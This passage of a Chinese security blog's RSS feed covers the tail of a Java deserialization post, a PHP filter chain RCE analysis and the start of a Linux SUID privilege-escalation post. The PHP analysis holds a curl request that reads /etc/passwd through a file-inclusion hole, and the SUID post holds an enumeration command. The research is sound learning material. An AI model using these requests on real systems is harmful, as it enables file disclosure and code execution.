&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">final&lt;/span> Object obj&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> String fieldName&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> Object value&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">final&lt;/span> Field field &lt;span style="color:#f92672">=&lt;/span> getField&lt;span style="color:#f92672">(&lt;/span>obj&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> fieldName&lt;span style="color:#f92672">);&lt;/span>
field&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>obj&lt;span style="color:#f92672">,&lt;/span> value&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/" target="_blank">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90" target="_blank">https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2024-01-08T16:57:37+08:00&lt;/strong>&lt;/p></description></item><item><title>PHP Filter RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/research/web/php-filter-rce/</link><pubDate>Fri, 29 Dec 2023 18:32:43 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/php-filter-rce/</guid><description>&lt;h3 id="php-filter是什么">PHP filter是什么&lt;/h3>
&lt;p>PHP filter是PHP定义的一个伪协议，用于在数据流打开时进行筛选过滤，在数据读取或者写入的时候通过过滤器对数据进行处理。PHP filter 可以使用多个过滤器进行处理。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#a6e22e">php&lt;/span>&lt;span style="color:#f92672">://&lt;/span>&lt;span style="color:#a6e22e">filter&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">过滤器&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#a6e22e">过滤器&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">resource&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">待过滤的数据流&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>require_once和require的参数是一个文件路径，指明要包含的文件，而PHP filter 提供了接口，使得可以通过这个接口访问到指定的文件内容，require在包含文件时，只关心文件内容，而不关心文件内容来自于何处，所以可以给require 传PHP filter参数，&lt;/p>
&lt;p>如果有如下代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
$file &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;page&amp;#39;&lt;/span>];
&lt;span style="color:#66d9ef">require&lt;/span>($file);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>则可以通过如下请求泄露敏感信息&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl &lt;span style="color:#e6db74">&amp;#34;http://localhost/test.php?page=php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>PHP的base64decode函数在处理base64编码的数据时，会自动规范化：去除字符串中不合法的字符并且忽略，而后尝试解码。
但PHP filter的base64解码行为和&lt;code>base64decode&lt;/code>行为略有不同，PHP filter的base64-decode不能处理随即插入的等号，此时可以使用UTF-7编码规避，UTF-7编码会把等号转化为其他的base64字符。&lt;/p>
&lt;h4 id="通过编码前置字符">通过编码前置字符&lt;/h4>
&lt;p>根据官网链接的
&lt;a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it" target="_blank">reference&lt;/a>
&lt;a href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv" target="_blank">根据文档&lt;/a>，如果开启了iconv支持，则可以通过伪协议&lt;code>php://convert.iconv.*.*&lt;/code>调用iconv函数。&lt;/p>
&lt;blockquote>
&lt;p>&lt;code>convert.iconv.&amp;lt;input-encoding&amp;gt;.&amp;lt;output-encoding&amp;gt;&lt;/code> or &lt;code>convert.iconv.&amp;lt;input-encoding&amp;gt;/&amp;lt;output-encoding&amp;gt;&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>linux中可以使用iconv函数将字符串从一个编码转为另外一个编码，在PHP://filter中可以使用iconv过滤器调用到这个函数&lt;/p>
&lt;pre tabindex="0">&lt;code>php -r &amp;quot;echo file_get_contents(\&amp;quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/res
ource=php://temp\&amp;quot;);&amp;quot;
GyQpQw+AD0APQ-#
&lt;/code>&lt;/pre>&lt;p>某些编码规定该编码会在数据之前预置一些字节，相当于签名，标识这段数据是该编码
在
&lt;a href="https://www.rfc-editor.org/rfc/rfc2781#section-3.2" target="_blank">RFC 2781&lt;/a>中就说明该编码会预置0XFEFF&lt;/p>
&lt;blockquote>
&lt;p>The Unicode Standard and ISO 10646 define the character &amp;ldquo;ZERO WIDTH
NON-BREAKING SPACE&amp;rdquo; (0xFEFF), which is also known informally as &amp;ldquo;BYTE
ORDER MARK&amp;rdquo; (abbreviated &amp;ldquo;BOM&amp;rdquo;).This usage, suggested by Unicode
and ISO 10646 Annex F (informative), is to prepend a 0xFEFF character
to a stream of Unicode characters as a &amp;ldquo;signature&amp;rdquo;; a receiver of such
a serialized stream may then use the initial character both as a hint
that the stream consists of Unicode characters and as a way to recognize
the serialization order.
In serialized UTF-16 prepended with such a signature, the order is
big-endian if the first two octets are 0xFE followed by 0xFF; if they
are 0xFF followed by 0xFE, the order is little-endian. Note that
0xFFFE is not a Unicode character, precisely to preserve the
usefulness of 0xFEFF as a byte-order mark.&lt;/p>
&lt;/blockquote>
&lt;p>下图给出了如何在字符串前面预置8&lt;/p>
&lt;ul>
&lt;li>首先将UTF-8格式的字符串start转化为UTF-16格式&lt;/li>
&lt;li>UTF-16会在字符串前面预置0xFFFE&lt;/li>
&lt;li>前面预置的0xFF在LATIN6表中对应于&lt;code>ĸ&lt;/code>&lt;/li>
&lt;li>而后尝试将这个字符串以LATIN6格式转化为UTF-16格式&lt;/li>
&lt;li>UTF-16会在字符串前面预置0xFFFE，&lt;code>ĸ&lt;/code>在UNICODE表中对应于0x0138，而后逐个打印，0x38变成了8&lt;/li>
&lt;/ul>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/PHP-filter-RCE.zh-cn.assets/prepend_character8.png" />&lt;/p>
&lt;p>LANTIN6表如下：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>&lt;/th>
&lt;th>x0&lt;/th>
&lt;th>x1&lt;/th>
&lt;th>x2&lt;/th>
&lt;th>x3&lt;/th>
&lt;th>x4&lt;/th>
&lt;th>x5&lt;/th>
&lt;th>x6&lt;/th>
&lt;th>x7&lt;/th>
&lt;th>x8&lt;/th>
&lt;th>x9&lt;/th>
&lt;th>xA&lt;/th>
&lt;th>xB&lt;/th>
&lt;th>xC&lt;/th>
&lt;th>xD&lt;/th>
&lt;th>xE&lt;/th>
&lt;th>xF&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0x&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1x&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2x&lt;/td>
&lt;td>SP&lt;/td>
&lt;td>!&lt;/td>
&lt;td>&amp;quot;&lt;/td>
&lt;td>#&lt;/td>
&lt;td>$&lt;/td>
&lt;td>%&lt;/td>
&lt;td>&amp;amp;&lt;/td>
&lt;td>'&lt;/td>
&lt;td>(&lt;/td>
&lt;td>)&lt;/td>
&lt;td>*&lt;/td>
&lt;td>+&lt;/td>
&lt;td>,&lt;/td>
&lt;td>-&lt;/td>
&lt;td>.&lt;/td>
&lt;td>/&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3x&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>2&lt;/td>
&lt;td>3&lt;/td>
&lt;td>4&lt;/td>
&lt;td>5&lt;/td>
&lt;td>6&lt;/td>
&lt;td>7&lt;/td>
&lt;td>8&lt;/td>
&lt;td>9&lt;/td>
&lt;td>:&lt;/td>
&lt;td>;&lt;/td>
&lt;td>&amp;lt;&lt;/td>
&lt;td>=&lt;/td>
&lt;td>&amp;gt;&lt;/td>
&lt;td>?&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4x&lt;/td>
&lt;td>@&lt;/td>
&lt;td>A&lt;/td>
&lt;td>B&lt;/td>
&lt;td>C&lt;/td>
&lt;td>D&lt;/td>
&lt;td>E&lt;/td>
&lt;td>F&lt;/td>
&lt;td>G&lt;/td>
&lt;td>H&lt;/td>
&lt;td>I&lt;/td>
&lt;td>J&lt;/td>
&lt;td>K&lt;/td>
&lt;td>L&lt;/td>
&lt;td>M&lt;/td>
&lt;td>N&lt;/td>
&lt;td>O&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5x&lt;/td>
&lt;td>P&lt;/td>
&lt;td>Q&lt;/td>
&lt;td>R&lt;/td>
&lt;td>S&lt;/td>
&lt;td>T&lt;/td>
&lt;td>U&lt;/td>
&lt;td>V&lt;/td>
&lt;td>W&lt;/td>
&lt;td>X&lt;/td>
&lt;td>Y&lt;/td>
&lt;td>Z&lt;/td>
&lt;td>[&lt;/td>
&lt;td>|]&lt;/td>
&lt;td>^&lt;/td>
&lt;td>_&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6x&lt;/td>
&lt;td>`&lt;/td>
&lt;td>a&lt;/td>
&lt;td>b&lt;/td>
&lt;td>c&lt;/td>
&lt;td>d&lt;/td>
&lt;td>e&lt;/td>
&lt;td>f&lt;/td>
&lt;td>g&lt;/td>
&lt;td>h&lt;/td>
&lt;td>i&lt;/td>
&lt;td>j&lt;/td>
&lt;td>k&lt;/td>
&lt;td>l&lt;/td>
&lt;td>m&lt;/td>
&lt;td>n&lt;/td>
&lt;td>o&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>7x&lt;/td>
&lt;td>p&lt;/td>
&lt;td>q&lt;/td>
&lt;td>r&lt;/td>
&lt;td>s&lt;/td>
&lt;td>t&lt;/td>
&lt;td>u&lt;/td>
&lt;td>v&lt;/td>
&lt;td>w&lt;/td>
&lt;td>x&lt;/td>
&lt;td>y&lt;/td>
&lt;td>z&lt;/td>
&lt;td>{&lt;/td>
&lt;td>|&lt;/td>
&lt;td>}&lt;/td>
&lt;td>~&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>8x&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>9x&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Ax&lt;/td>
&lt;td>NBSP&lt;/td>
&lt;td>Ą&lt;/td>
&lt;td>Ē&lt;/td>
&lt;td>Ģ&lt;/td>
&lt;td>Ī&lt;/td>
&lt;td>Ĩ&lt;/td>
&lt;td>Ķ&lt;/td>
&lt;td>§&lt;/td>
&lt;td>Ļ&lt;/td>
&lt;td>Đ&lt;/td>
&lt;td>Š&lt;/td>
&lt;td>Ŧ&lt;/td>
&lt;td>Ž&lt;/td>
&lt;td>SHY&lt;/td>
&lt;td>Ū&lt;/td>
&lt;td>Ŋ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Bx&lt;/td>
&lt;td>°&lt;/td>
&lt;td>ą&lt;/td>
&lt;td>ē&lt;/td>
&lt;td>ģ&lt;/td>
&lt;td>ī&lt;/td>
&lt;td>ĩ&lt;/td>
&lt;td>ķ&lt;/td>
&lt;td>·&lt;/td>
&lt;td>ļ&lt;/td>
&lt;td>đ&lt;/td>
&lt;td>š&lt;/td>
&lt;td>ŧ&lt;/td>
&lt;td>ž&lt;/td>
&lt;td>―&lt;/td>
&lt;td>ū&lt;/td>
&lt;td>ŋ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Cx&lt;/td>
&lt;td>Ā&lt;/td>
&lt;td>Á&lt;/td>
&lt;td>Â&lt;/td>
&lt;td>Ã&lt;/td>
&lt;td>Ä&lt;/td>
&lt;td>Å&lt;/td>
&lt;td>Æ&lt;/td>
&lt;td>Į&lt;/td>
&lt;td>Č&lt;/td>
&lt;td>É&lt;/td>
&lt;td>Ę&lt;/td>
&lt;td>Ë&lt;/td>
&lt;td>Ė&lt;/td>
&lt;td>Í&lt;/td>
&lt;td>Î&lt;/td>
&lt;td>Ï&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Dx&lt;/td>
&lt;td>Ð&lt;/td>
&lt;td>Ņ&lt;/td>
&lt;td>Ō&lt;/td>
&lt;td>Ó&lt;/td>
&lt;td>Ô&lt;/td>
&lt;td>Õ&lt;/td>
&lt;td>Ö&lt;/td>
&lt;td>Ũ&lt;/td>
&lt;td>Ø&lt;/td>
&lt;td>Ų&lt;/td>
&lt;td>Ú&lt;/td>
&lt;td>Û&lt;/td>
&lt;td>Ü&lt;/td>
&lt;td>Ý&lt;/td>
&lt;td>Þ&lt;/td>
&lt;td>ß&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Ex&lt;/td>
&lt;td>ā&lt;/td>
&lt;td>á&lt;/td>
&lt;td>â&lt;/td>
&lt;td>ã&lt;/td>
&lt;td>ä&lt;/td>
&lt;td>å&lt;/td>
&lt;td>æ&lt;/td>
&lt;td>į&lt;/td>
&lt;td>č&lt;/td>
&lt;td>é&lt;/td>
&lt;td>ę&lt;/td>
&lt;td>ë&lt;/td>
&lt;td>ė&lt;/td>
&lt;td>í&lt;/td>
&lt;td>î&lt;/td>
&lt;td>ï&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Fx&lt;/td>
&lt;td>ð&lt;/td>
&lt;td>ņ&lt;/td>
&lt;td>ō&lt;/td>
&lt;td>ó&lt;/td>
&lt;td>ô&lt;/td>
&lt;td>õ&lt;/td>
&lt;td>ö&lt;/td>
&lt;td>ũ&lt;/td>
&lt;td>ø&lt;/td>
&lt;td>ų&lt;/td>
&lt;td>ú&lt;/td>
&lt;td>û&lt;/td>
&lt;td>ü&lt;/td>
&lt;td>ý&lt;/td>
&lt;td>&lt;strong>þ&lt;/strong>&lt;/td>
&lt;td>&lt;strong>ĸ&lt;/strong>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>UNICODE如下：
&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/PHP-filter-RCE.zh-cn.assets/1.png" />&lt;/p>
&lt;p>通过将恶意代码转化为base64形式，而后通过编码预置字符，最后使用&lt;code>convert.base64-decode&lt;/code>尝试解码预置的数据，就可以使得PHP filter最后解码出恶意代码。&lt;/p>
&lt;p>当使用require时，且路径可控，就可以利用PHP filter执行任意代码。&lt;/p>
&lt;p>参考链接&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://gynvael.coldwind.pl/?id=671" target="_blank">https://gynvael.coldwind.pl/?id=671&lt;/a>
&lt;a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d" target="_blank">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d&lt;/a>
&lt;a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it" target="_blank">https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-12-29T18:32:43+08:00&lt;/strong>&lt;/p></description></item><item><title>Suid</title><link>https://www.ch35tnut.site/zh-cn/research/linux/suid/</link><pubDate>Fri, 08 Dec 2023 10:30:07 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/linux/suid/</guid><description>&lt;h3 id="简介">简介&lt;/h3>
&lt;p>SUID全称&lt;strong>S&lt;/strong>et owner &lt;strong>U&lt;/strong>ser &lt;strong>ID&lt;/strong> up on execution，是Linux给可执行文件的一个属性，设置了s位的程序在运行时其&lt;strong>Effective UID&lt;/strong>将会设置为这个程序的所有者。比如，&lt;code>/bin/ping&lt;/code>这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其&lt;strong>Effective UID&lt;/strong>就是0，等同于拥有了root权限。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">➜ c ls -ldb &lt;span style="color:#66d9ef">$(&lt;/span>which pkexec&lt;span style="color:#66d9ef">)&lt;/span>
-rwsr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">30872&lt;/span> 2023年 2月13日 /usr/bin/pkexec
&lt;/code>&lt;/pre>&lt;/div>&lt;p>SUID文件的出现是为了解决一些操作只能由root权限进行，但普通权限用户也需要能通过某种方式进行调用，比如passwd，/etc/shadow只有root可写，但用户自己显然需要可以修改密码，所以passwd被设置为SUID程序，使得普通用户能通过passwd临时获取到修改shadow文件的能力。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">-rw-r----- &lt;span style="color:#ae81ff">1&lt;/span> root shadow &lt;span style="color:#ae81ff">1411&lt;/span> 2023年 5月10日 /etc/shadow
-rwsr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">68248&lt;/span> 2022年11月11日 /usr/bin/passwd
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Linux中每个用户都有独一无二的ID，称为UserID。
为进程定义了三个ID：&lt;/p>
&lt;ul>
&lt;li>Real UserID&lt;/li>
&lt;li>Effective UserID&lt;/li>
&lt;li>Saved UserID&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>Real UserID：对于一个进程，这个ID是启动这个进程的用户的用户ID，这个ID定义了这个进程有权访问那些文件。&lt;/li>
&lt;li>Effective UserID：通常这个ID和Real UserID相同，但有时会不一样，来允许非特权用户访问只能由特权用户访问的文件。
当非特权的用户运行此文件时，euid是文件所属的用户id，ruid才是当前用户的id
&lt;pre tabindex="0">&lt;code>-rwsr-xr-x 1 root root 68248 2022年11月11日 /usr/bin/passwd
┌──(chestnut㉿chestnut)-[/root/code/c]
└─$ passwd
为 chestnut 更改 STRESS 密码。
➜ c ps -eo pid,euid,ruid | grep 1692693
1692693 0 1000
&lt;/code>&lt;/pre>``&lt;/li>
&lt;li>Saved UserID，当进程以提升权限运行时，需要做一些非特权的操作，可以通过临时切换到非特权账户来实现。
在执行低权限工作时，将Effective UID 更改为某个较低的权限值，并将 euid 保存到Saved userID（suid），以便在任务完成时用于切换回特权帐户。&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.geeksforgeeks.org/real-effective-and-saved-userid-in-linux/" target="_blank">https://www.geeksforgeeks.org/real-effective-and-saved-userid-in-linux/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>查找SUID程序&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">find / -perm -4000 -type f -exec ls -ldb &lt;span style="color:#f92672">{}&lt;/span> &lt;span style="color:#ae81ff">\;&lt;/span>
-perm -4000 查找权限为4000
-type f 只查找普通文件,过滤掉目录等其他类型
-&lt;span style="color:#f92672">[&lt;/span>/root/code/c/suid.c
/root/code/c/CMakeLists.txt&lt;span style="color:#f92672">](&lt;/span>vscode-remote://ssh-remote%2B192.168.59.211/root/code/c/suid.c&lt;span style="color:#f92672">)&lt;/span>exec ls -ldb &lt;span style="color:#f92672">{}&lt;/span> ; 对找到的文件执行ls -ldb命令,显示文件详细信息。 &lt;span style="color:#f92672">{}&lt;/span>表示find找到的文件名,会逐个代入。 ;表示-exec选项命令结束。
; 的作用就是隔离 find 命令行和 -exec 指定的命令,避免解析错误。
-rwsr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">30872&lt;/span> 2023年 2月13日 /usr/bin/pkexec
-rwsr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">14888&lt;/span> 2023年 1月 3日 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-- &lt;span style="color:#ae81ff">1&lt;/span> root kismet &lt;span style="color:#ae81ff">146216&lt;/span> 2022年12月27日 /usr/bin/kismet_cap_nxp_kw41z
-rwsr-xr-- &lt;span style="color:#ae81ff">1&lt;/span> root kismet &lt;span style="color:#ae81ff">142120&lt;/span> 2022年12月27日 /usr/bin/kismet_cap_nrf_51822
-rwsr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">59704&lt;/span> 2023年 2月13日 /usr/bin/mount
-rwsr-xr-- &lt;span style="color:#ae81ff">1&lt;/span> root kismet &lt;span style="color:#ae81ff">216392&lt;/span> 2022年12月27日 /usr/bin/kismet_cap_linux_wifi
-rwsr-xr-- &lt;span style="color:#ae81ff">1&lt;/span> root kismet &lt;span style="color:#ae81ff">142120&lt;/span> 2022年12月27日 /usr/bin/kismet_cap_ubertooth_one
-rwsr-xr-- &lt;span style="color:#ae81ff">1&lt;/span> root kismet &lt;span style="color:#ae81ff">146216&lt;/span> 2022年12月27日 /usr/bin/kismet_cap_rz_killerbee
-rwsr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">68248&lt;/span> 2022年11月11日 /usr/bin/passwd
-rwsr-xr-- &lt;span style="color:#ae81ff">1&lt;/span> root kismet &lt;span style="color:#ae81ff">146216&lt;/span> 2022年12月27日 /usr/bin/kismet_cap_nrf_mousejack
-rwsr-xr-- &lt;span style="color:#ae81ff">1&lt;/span> root kismet &lt;span style="color:#ae81ff">142120&lt;/span> 2022年12月27日 /usr/bin/kismet_cap_nrf_52840
-rwsr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">88496&lt;/span> 2022年11月11日 /usr/bin/gpasswd
-rwsr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">35128&lt;/span> 2023年 2月13日 /usr/bin/umount
-rwsr-xr-- &lt;span style="color:#ae81ff">1&lt;/span> root kismet &lt;span style="color:#ae81ff">154408&lt;/span> 2022年12月27日 /usr/bin/kismet_cap_linux_bluetooth
-rwsr-xr-- &lt;span style="color:#ae81ff">1&lt;/span> root kismet &lt;span style="color:#ae81ff">146216&lt;/span> 2022年12月27日 /usr/bin/kismet_cap_ti_cc_2531
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="shell中的suid细节">shell中的SUID细节&lt;/h3>
&lt;p>在
&lt;a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html&lt;/a>中提到Ubuntu对dash进行了patch。
找到patch地址为
&lt;a href="https://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz" target="_blank">https://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz&lt;/a>，代码如下，当on=1时会略过权限检查，当on不为1时，会通过geteuid和getegid获取当前进程的effective user ID和effective group ID，并与通过getuid和getgid获取的real user ID和real group ID进行比较。
如果当前进程对应的可执行文件为SUID文件且当前运行这个文件的用户不是文件属主时，会重新通过setuid和setgid将当前进程的权限设置为real ID，即运行这个可执行文件的用户的权限。
当文件不是SUID文件时rid和eid相等，不会进入if内，或者文件是SUID文件并且运行这个文件的用户是文件属主rid和eid也会相等，不会进入if内。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#f92672">+&lt;/span>diff &lt;span style="color:#f92672">-&lt;/span>Naurp dash&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0.5.7&lt;/span>.ori&lt;span style="color:#f92672">/&lt;/span>src&lt;span style="color:#f92672">/&lt;/span>main.c dash&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0.5.7&lt;/span>&lt;span style="color:#f92672">/&lt;/span>src&lt;span style="color:#f92672">/&lt;/span>main.c
&lt;span style="color:#f92672">+---&lt;/span> dash&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0.5.7&lt;/span>.ori&lt;span style="color:#f92672">/&lt;/span>src&lt;span style="color:#f92672">/&lt;/span>main.c &lt;span style="color:#ae81ff">2015&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">06&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">03&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">45&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">22.766472281&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0400&lt;/span>
&lt;span style="color:#f92672">++++&lt;/span> dash&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0.5.7&lt;/span>&lt;span style="color:#f92672">/&lt;/span>src&lt;span style="color:#f92672">/&lt;/span>main.c &lt;span style="color:#ae81ff">2015&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">06&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">03&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">58&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">56.484258181&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0400&lt;/span>
